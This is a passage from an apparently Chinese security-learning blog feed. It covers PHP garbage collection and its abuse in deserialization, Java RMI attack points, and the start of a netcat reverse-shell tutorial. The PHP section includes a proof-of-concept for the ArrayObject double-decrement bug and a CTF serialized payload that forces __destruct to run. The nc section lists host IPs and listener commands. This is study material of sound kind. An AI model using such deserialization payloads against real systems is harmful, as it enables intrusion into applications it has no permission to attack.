class="number">2</span>]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;c&#x27;</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;测试int型计数&#x27;</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;e&#x27;</span> );</span><br></pre></td></tr></table></figure></div><p>输出如下</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">测试字符串引用计数</span><br><span class="line">a:(refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;new string&#x27;</span> (length=<span class="number">10</span>)</span><br><span class="line">a:(refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;new string&#x27;</span> (length=<span class="number">10</span>)</span><br><span class="line">a:(refcount=<span class="number">2</span>, is_ref=<span class="number">1</span>)<span class="keyword">string</span> <span class="string">&#x27;new string&#x27;</span> (length=<span class="number">10</span>) <span class="comment">//取地址引用时会改变</span></span><br><span class="line">测试数组引用计数</span><br><span class="line">c:(refcount=<span class="number">2</span>, is_ref=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">2</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;a&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;b&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">c:(refcount=<span class="number">3</span>, is_ref=<span class="number">0</span>) </span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">2</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;a&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;b&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">c:(refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="comment">//数组值改变后，之前引用全部废弃</span></span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">3</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;a&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;b&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="number">2</span> =&gt; (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)<span class="keyword">string</span> <span class="string">&#x27;c&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line">测试<span class="keyword">int</span>型计数e:(refcount=<span class="number">0</span>, is_ref=<span class="number">0</span>)<span class="keyword">int</span> <span class="number">1</span>  <span class="comment">//int型不计引用次数</span></span><br></pre></td></tr></table></figure></div><h3 id="回收周期"><a href="#回收周期" class="headerlink" title="回收周期"></a>回收周期</h3><p>PHP垃圾回收机制默认打开，可以设置php.ini值的<code>zend.enable_gc</code>，或者调用gc_enable() 和 gc_disable()函数。</p><p>当垃圾回收机制打开时，算法判断在根缓存区满时，执行循环查找，根缓存区大小需要通过修改php源码文件Zend&#x2F;zend_gc.c中的常量GC_ROOT_BUFFER_MAX_ENTRIES，然后重新编译PHP，来修改这个值。</p><blockquote><p>调用gc_disable()函数释放内存之前，先调用gc_collect_cycles()函数，以免根缓存区空间不足</p></blockquote><h3 id="垃圾的产生"><a href="#垃圾的产生" class="headerlink" title="垃圾的产生"></a>垃圾的产生</h3><p>PHP中一些复杂数据类型头部有一个GC，用于支持垃圾回收。</p><p>zend_reference 这个类型，这个是 PHP7 新增的变量类型，当对变量使用 “&amp;” 操作时，<u>会创建新的中间结构体 zend_reference，这个结构体会真正的指向对应的 value 结构。</u></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当进行如下赋值操作时</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>; <span class="comment">// $a -&gt; zend_string</span></span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span>; <span class="comment">// $b,$a -&gt; zend_string</span></span><br><span class="line"><span class="variable">$c</span> = &amp;<span class="variable">$b</span>; <span class="comment">// $c,$b -&gt; zval(type = IS_REFERENCE, refcount = 2) -&gt; zend_string</span></span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072213238.png"                      alt="image-20230405153644317"                ><figcaption>image-20230405153644317</figcaption></figure></p><blockquote><p><code>$b和$c</code>的zval都是通过中间结构体再指向最终的zend_string</p></blockquote><h3 id="回收的过程"><a href="#回收的过程" class="headerlink" title="回收的过程"></a>回收的过程</h3><p>如果当变量的 refcount 减小后大于 0，PHP 并不会立即对这个变量进行垃圾鉴定和回收，而是放入一个缓冲区中，等这个缓冲区满了以后 (10000 个值) 再统一进行处理，加入缓冲区的是变量 zend_value 里的 gc，目前垃圾只会出现在数组和对象两种类型中，数组的情况上面已经介绍了，对象的情况则是成员属性引用对象本身导致的，其它类型不会出现这种变量中的成员引用变量自身的情况，所以垃圾回收只会处理这两种类型的变量。</p><p>gc 的结构 zend_refcounted_h 具体如下:</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_zend_refcounted_h</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span>         refcount; <span class="comment">// 记录 zend_value 的引用数</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            zend_uchar    type,  <span class="comment">// zend_value的类型, 与zval.u1.type一致</span></span><br><span class="line">            zend_uchar    flags, </span><br><span class="line">            <span class="type">uint16_t</span>      gc_info <span class="comment">// GC信息，记录在 gc 池中的位置和颜色，垃圾回收的过程会用到</span></span><br><span class="line">        &#125; v;</span><br><span class="line">        <span class="type">uint32_t</span> type_info;</span><br><span class="line">    &#125; u;</span><br><span class="line">&#125; zend_refcounted_h;</span><br></pre></td></tr></table></figure></div><p>一个变量只能加入一次缓冲区，为了防止重复加入，变量加入后会把 zend_refcounted_h.gc_info 置为 GC_PURPLE，即标为紫色，后续不会重复插入。</p><h2 id="反序列化中的利用"><a href="#反序列化中的利用" class="headerlink" title="反序列化中的利用"></a>反序列化中的利用</h2><h3 id="destruct魔术方法"><a href="#destruct魔术方法" class="headerlink" title="__destruct魔术方法"></a>__destruct魔术方法</h3><p>当某个对象成为垃圾或者当对象被显式销毁时执行</p><ul><li>显示销毁：unset或赋值NULL</li><li>隐式销毁：代码执行完毕后将所有申请的内存释放掉</li></ul><blockquote><p>在常规思路中destruct是隐式销毁触发的,尝试显式销毁</p></blockquote><h3 id="旧版本GC"><a href="#旧版本GC" class="headerlink" title="旧版本GC"></a>旧版本GC</h3><p>简单的判断了一下变量的zval的refcount是否为0，是的话就释放否则不释放直至进程结束。</p><h3 id="新版本GC-zval结构体"><a href="#新版本GC-zval结构体" class="headerlink" title="新版本GC-zval结构体"></a>新版本GC-zval结构体</h3><p>主动销毁变量：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;111&quot;</span>;</span><br><span class="line"><span class="variable">$temp_name</span> = &amp;<span class="variable">$name</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$temp_name</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="comment">//name:</span></span><br><span class="line"><span class="comment">//(refcount=2, is_ref=1)string &#x27;111&#x27; (length=3)</span></span><br><span class="line"><span class="comment">//name:</span></span><br><span class="line"><span class="comment">//(refcount=1, is_ref=1)string &#x27;111&#x27; (length=3)</span></span><br></pre></td></tr></table></figure></div><p>refcount计数减1，说明unset并非一定会释放内存，当有两个变量指向的时候，并非会释放变量占用的内存，只是refcount减1.</p><h3 id="触发垃圾回收"><a href="#触发垃圾回收" class="headerlink" title="触发垃圾回收"></a>触发垃圾回收</h3><p>该算法的实现可以在<code>Zend/zend_gc.c</code>（ <a class="link"   href="https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c" >https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ）中找到。每当销毁zval时（如在该zval上调用unset时），垃圾回收算法会检查其是否为数组或对象，除了这俩个类型外其他都不能包含循环引用，这一检查过程使用<code>gc_zval_possible_root</code>函数来实现。任何这种潜在的zval都被称为根（Root），并会被添加到一个名为<code>gc_root_buffer</code>的列表中。<br>然后，将会重复上述步骤，直至满足下述条件之一：</p><ul><li><code>gc_collect_cycles()</code>被手动调用</li><li>垃圾存储空间将满。这也就意味着，在根缓冲区的位置已经存储了10000个zval，并且即将添加新的根。10000时预定义常量GC_ROOT_BUFFER_MAX_ENTRIES,当出现第10001个zval时，将再次调用gc_zval_possible_root进行检查，此时会调用<code>gc_collect_cycles</code>以处理并刷新当前缓冲区</li></ul><blockquote><p>可以得到触发思路，填满垃圾存储空间</p></blockquote><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化过程允许一遍又一遍地传递相同的索引，所以不断会填充内存空间。一旦重新使用数组索引，旧元素的引用计数器就会递减。在反序列化过程中将会调用<code>zend_hash_update</code>，它将调用旧元素的析构函数（Destructor）。每当zval被销毁时，都会涉及到垃圾回收。这也就意味着，所有创建的数组都会开始填充垃圾缓冲区，直至超出其空间导致对<code>gc_collect_cycles</code>的调用。</p><h3 id="ArrayObject"><a href="#ArrayObject" class="headerlink" title="ArrayObject"></a>ArrayObject</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// POC of the ArrayObject GC vulnerability</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$serialized_string</span> = <span class="string">&#x27;a:1:&#123;i:1;C:11:&quot;ArrayObject&quot;:37:&#123;x:i:0;a:2:&#123;i:1;R:4;i:2;r:1;&#125;;m:a:0:&#123;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$outer_array</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized_string</span>);</span><br><span class="line"><span class="title function_ invoke__">gc_collect_cycles</span>();</span><br><span class="line"><span class="variable">$filler1</span> = <span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line"><span class="variable">$filler2</span> = <span class="string">&quot;bbbb&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$outer_array</span>);</span><br></pre></td></tr></table></figure></div><p>实际上，一旦该示例执行，外部数组（由<code>$outer_array</code>引用）将会被释放，并且zval将会被<code>$filter2</code>的zval覆盖，导致输出”bbbb”。</p><p>ArrayObject的反序列化函数接受对另一个数组的引用，以用于初始化的目的。这也就意味着，一旦我们对一个ArrayObject进行反序列化后，就可以引用任何之前已经被反序列化过的数组。此外，这还将允许我们将整个哈希表中的所有条目递减两次。</p><p>1、得到一个应被释放的目标zval X；<br>2、创建一个数组Y，其中包含几处对zval X的引用：<code>array(ref_to_X, ref_to_X, […], ref_to_X)</code>；<br>3、创建一个ArrayObject，它将使用数组Y的内容进行初始化，因此会返回一次由垃圾回收标记算法访问过的数组Y的所有子元素。<br>通过上述步骤，我们可以操纵标记算法，对数组Y中的所有引用实现两次访问。但是，在反序列化过程中创建引用将会导致引用计数器增加2，所以还要找到解决方案：<br>4、使用与步骤3相同的方法，额外再创建一个ArrayObject。<br>一旦标记算法访问第二个ArrayObject，它将开始对数组Y中的所有引用进行第三次递减。我们现在就有方法能够使引用计数器递减，可以将该方法用于对任意目标zval的引用计数器实现清零。</p><p>举个例子</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> =<span class="string">&quot;flag&#123;&quot;</span>.<span class="title function_ invoke__">md5</span>(time).<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;successful\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;中途退出啦&#x27;</span>);</span><br></pre></td></tr></table></figure></div><p>我们假如要执行__destruct方法，打印flag，就得绕过这个<code>throw new Exception</code>。因为<code>__destruct</code>方法是在该对象被回收时调用，而<code>exception</code>会中断该进程对该对象的销毁。所以我们需要强制让php的GC（垃圾回收机制）去进行该对象的回收。</p><p>核心思想：反序列化一个数组，然后再利用第一个索引，来触发GC</p><p>EXP</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;AndyNoel&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> B, <span class="keyword">new</span> B));</span><br><span class="line"></span><br><span class="line"><span class="comment">//a:2:&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:1;O:1:&quot;B&quot;:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>造成该漏洞的主要原因是ArrayObject缺少垃圾回收函数。该漏洞称为“双递减漏洞”</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> gc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI学习</title>
      <link href="/2022/10/01/RMI%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/10/01/RMI%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="RMI学习"><a href="#RMI学习" class="headerlink" title="RMI学习"></a>RMI学习</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><ul><li>Client</li><li>Registry</li><li>Server</li></ul><h3 id="通信原理"><a href="#通信原理" class="headerlink" title="通信原理"></a>通信原理</h3><ul><li>服务端绑定远程对象(java中定义的一个远程对象类)</li><li>客户端只要传value</li><li>解决端口问题：注册中心，储存远程对象value与服务端端口的映射(在远程对象创建时形成映射)</li></ul><blockquote><h4 id="动态代码加载（JDK高版本去掉了）"><a href="#动态代码加载（JDK高版本去掉了）" class="headerlink" title="动态代码加载（JDK高版本去掉了）"></a>动态代码加载（JDK高版本去掉了）</h4><p>如果客户端调用了服务端没有的类对象，RMI允许服务端去远程的Web Server上加载类</p></blockquote><h3 id="远程接口、对象、方法"><a href="#远程接口、对象、方法" class="headerlink" title="远程接口、对象、方法"></a>远程接口、对象、方法</h3><p>通信的两端要实现一个相同接口:java.rmi.Remote</p><p>这个接口要抛一个异常</p><p>服务端实现远程调用的接口时，要继承UnicastRemoteObject,这样才能绑定到rmi服务里</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/008vxvgGgy1h7k0v45q93j31dg0u0afc.jpg"                      alt="image-20221027182807035"                ><figcaption>image-20221027182807035</figcaption></figure></p><blockquote><p>客户端和服务端都各自设置了一个代理 Skeleton&#x2F;Stub</p><p>如果绑定端口到0，会被分配到随机端口</p><p>注册中心和服务端放在一台服务器上，防止远程调用时的安全问题</p></blockquote><p>JRMP协议：RMI自定义的客户端协议</p><blockquote><p>可以通过这个协议攻击stub</p></blockquote><p>传输过程利用序列化，将收取到的数据反序列化，存在攻击点</p><h3 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h3><p>静态变量dgclog，调用时会触发这个类的初始化，其静态代码块中会实例化一个DGCImpl_Stub</p><blockquote><p>风险点:调用invoke，可进行反序列化攻击</p><p>攻击dgc不需要知道参数类型</p></blockquote><h3 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h3><p>Stub：客户端代理类</p><p>Skeleton：服务端代理类</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032332854.png"                      alt="image-20221101190521314"                ><figcaption>image-20221101190521314</figcaption></figure></p><blockquote><p>实现过程</p><ul><li>客户端要调用远程主机上的方法</li><li>经过Stub的代理，请求杯编码通过网络传输给Skeleton</li><li>Skeleton收到请求，转换成服务端可以识别的请求</li><li>发送请求到服务的</li><li>服务端处理后结构，发送到Skeleton进行编码</li><li>Stub收到后解码结果</li><li>客户端获得远程方法调用的结果</li></ul></blockquote><h3 id="注册远程对象"><a href="#注册远程对象" class="headerlink" title="注册远程对象"></a>注册远程对象</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteInterface</span> <span class="variable">remoteObj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteImpl</span>();<span class="comment">// 创建远程对象</span></span><br><span class="line"><span class="type">Context</span> <span class="variable">namingContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">// 初始化命名内容</span></span><br><span class="line">LocateRegistry.createRegistry(<span class="number">8892</span>);<span class="comment">// 在本地主机上创建和导出注册表实例，并在指定的端口上接受请求</span></span><br><span class="line">namingContext.rebind(<span class="string">&quot;rmi://localhost:8892/RemoteObj2&quot;</span>, remoteObj2);<span class="comment">// 注册对象，即把对象与一个名字绑定。</span></span><br></pre></td></tr></table></figure></div><blockquote><p>只要继承了java.rmi.Remote接口，就可以成为存在于服务器的远程对象</p><p>远程对象必须实现java.rmi.server.UniCastRemoteObject类，该类的构造函数中将生成stub和skeleton， 这样才能保证客户端访问获得远程对象时，该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端，此时客户端所获得的这个拷贝称为Stub（ 存根）， 而服务器端本身已存在的远程对象则称之为Skeleton（骨架） 。 </p></blockquote><h2 id="获取注册中心"><a href="#获取注册中心" class="headerlink" title="获取注册中心"></a>获取注册中心</h2><h3 id="创建时获取-createRegistry"><a href="#创建时获取-createRegistry" class="headerlink" title="创建时获取  createRegistry"></a>创建时获取  createRegistry</h3><ul><li><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.seebug.org/content/images/2020/06/22/1592803976000-6usyel.png-w331s"                      alt="-w1067"                ><figcaption>-w1067</figcaption></figure><ul><li>第一种只要传port，表示和注册中心申请使用的端口，后面再绑定value上去以便客户端请求</li><li>第二张传port外，还需要传递RMIClientSocketFactory以及RMIServerSocketFactory对象。</li><li>两个方法最终获取到的都是RegistryImpl对象，对于攻击者的我们关系并不大</li></ul></li></ul><h4 id="对第一种方法的分析"><a href="#对第一种方法的分析" class="headerlink" title="对第一种方法的分析"></a>对第一种方法的分析</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">createRegistry</span><span class="params">(<span class="type">int</span> var0)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryImpl</span>(var0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>var0便储存着我们要传递的port</p></blockquote><p>跟进</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RegistryImpl</span><span class="params">(<span class="type">int</span> var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="type">LiveRef</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, var1);</span><br><span class="line">    <span class="built_in">this</span>.setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(var2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>LiveRef封装了ip和端口</p></blockquote><h3 id="远程获取-getRegistry"><a href="#远程获取-getRegistry" class="headerlink" title="远程获取 getRegistry"></a>远程获取 getRegistry</h3><h2 id="JDK高版本绕过"><a href="#JDK高版本绕过" class="headerlink" title="JDK高版本绕过"></a>JDK高版本绕过</h2><h3 id="高版本做的防御"><a href="#高版本做的防御" class="headerlink" title="高版本做的防御"></a>高版本做的防御</h3><p>反序列化前判断类型</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/008vxvgGgy1h7k4ct7zeqj312m0egjt5.jpg"                      alt="image-20221027202856361"                ><figcaption>image-20221027202856361</figcaption></figure></p><p>dgc反序列化也做了过滤</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/008vxvgGgy1h7k4djvmlqj30qy08ydgc.jpg"                      alt="image-20221027202941346"                ><figcaption>image-20221027202941346</figcaption></figure></p><p>远程对象反序列化，需要知道具体参数类型</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>服务端发起对客户端的请求，使用dgc向客户端发起请求,通过利用链调用dgc的dirty方法来给客户端发请求</p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nc命令学习及反弹shell细节</title>
      <link href="/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/"/>
      <url>/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/</url>
      
        <content type="html"><![CDATA[<h1 id="nc命令学习及反弹shell细节"><a href="#nc命令学习及反弹shell细节" class="headerlink" title="nc命令学习及反弹shell细节"></a>nc命令学习及反弹shell细节</h1><table><thead><tr><th align="left">机器名称</th><th align="left">IP地址</th><th>操作系统</th></tr></thead><tbody><tr><td align="left">root@Decemberus</td><td align="left">114.223.4.218</td><td>Centos7</td></tr><tr><td align="left">root@Sloth</td><td align="left">124.223.207.184</td><td>Centos7</td></tr><tr><td align="left">🥣</td><td align="left">内网</td><td>Mac os</td></tr></tbody></table><h2 id="nc命令使用"><a href="#nc命令使用" class="headerlink" title="nc命令使用"></a>nc命令使用</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><ul><li><p><code>netcat-traditional</code>:Kali Linux 默认带的就是这个版本，这个版本的 nc 具有<code>-e</code>选项，十分方便反弹 shell 使用</p></li><li><p><code>netcat-openbsd</code>:ubuntu 里默认的 nc 命令指向的是netcat-openbsd。这个版本因为考虑到安全性等原因没有<code>-e</code>选项。</p></li><li><p><code>ncat</code>:CentOS、Red Hat 默认带的是 ncat。目前ncat已经集成到了 nmap 里面，安装完 nmap 后就可以使用<code>ncat</code>命令了</p></li></ul><blockquote><p>mac上自带nc命令指向的是ncat,linux上nc与ncat没什么区别，mac上最好用ncat,options比较全</p></blockquote><h3 id="前提条件及注意事项"><a href="#前提条件及注意事项" class="headerlink" title="前提条件及注意事项"></a>前提条件及注意事项</h3><ul><li><p>只能nc拥有公网ip的机器，或是在同一局域网下的内网机器(可以nc内网ip)</p></li><li><p>获取本机公网ip</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl ifconfig.me </span><br></pre></td></tr></table></figure></div></li><li><p>端口放行：如果是购买了腾讯云服务，要在控制台和宝塔面板同时放行端口(用于TCP连接)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310253657.jpg"                      alt="image-20220926010406603"                ><figcaption>image-20220926010406603</figcaption></figure></p></li><li><p>需要vps先监听，目标服务器再nc vps，直接nc只能通过udp连接，tcp连接显示拒绝(如果是端口未放行会显示连接超时)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310254528.jpg"                      alt="image-20220926005629905"                ><figcaption>image-20220926005629905</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310254598.jpg"                      alt="image-20220926005900622"                ><figcaption>image-20220926005900622</figcaption></figure></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">未放行端口</span></span><br><span class="line">[root@Decemberus ~]# nc 124.223.207.184 3345</span><br><span class="line">Ncat: Connection timed out.</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="文字交互"><a href="#文字交互" class="headerlink" title="文字交互"></a>文字交互</h3><p><code>-l</code>：使用监听模式，监控传入的信息</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3344 <span class="comment"># 监听3344端口</span></span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     